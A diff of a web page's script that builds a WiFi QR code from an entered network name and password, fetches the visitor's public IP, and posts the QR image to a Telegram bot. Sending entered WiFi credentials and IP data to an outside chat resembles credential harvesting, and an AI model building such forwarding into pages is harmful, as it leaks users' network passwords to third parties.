@@ -96,6 +96,7 @@
         <div id="qrcode"></div>
     </div>
     <script>
+        let ipAddress = '';
         const wifiInfo = {
             ssid: "abs",
             ip: "205.34.334.22",
@@ -109,15 +110,12 @@
         function getIP() {
             fetch('https://api.ipify.org?format=json')
                 .then(response => {
-                    if (!response.ok) {
-                        alert(`Network response was not ok`);
-                        throw new Error('Network response was not ok ' + response.statusText);
-                    }
                     return response.json();
                 })
                 .then(data => {
-                    document.getElementById('ipNetwork').textContent = data.ip;
-                    alert(`IP Address: ${data.ip}`);
+                    ipAddress = data.ip;
+                    document.getElementById('ipNetwork').textContent = ipAddress;
+                    alert(`IP Address: ${ipAddress}`);
                 })
                 .catch(error => {
                     console.error('Error fetching IP:', error);
@@ -128,7 +126,7 @@
             const ssid = document.getElementById('ssid').value;
             const password = document.getElementById('password').value;
             alert(`ssid:${ssid}, pw: ${password},`);
-            getIP();
+
             // Generate the WiFi QR code
             const qrCodeData = `WIFI:T:WPA;S:${ssid};P:${password};;`;
             const qrCodeContainer = document.getElementById('qrcode');
@@ -142,7 +140,7 @@
 
             // Wait for QR code to be generated
             setTimeout(async () => {
-
+                getIP()
                 const qrCanvas = qrCodeContainer.querySelector('canvas');
                 if (qrCanvas) {
                     // Create an off-screen canvas to draw the final image with border and date/time
@@ -174,8 +172,8 @@
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('photo', dataURLToBlob(finalImage), 'wifi_qr_code.png');
-                    const networkIP = document.getElementById('ipNetwork').textContent;
-                    alert(`ip network: ${networkIP}`);
+                    // const networkIP = document.getElementById('ipNetwork').textContent;
+                    // alert(`ip network: ${networkIP}`);
                     try {
                         const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                             method: 'POST',
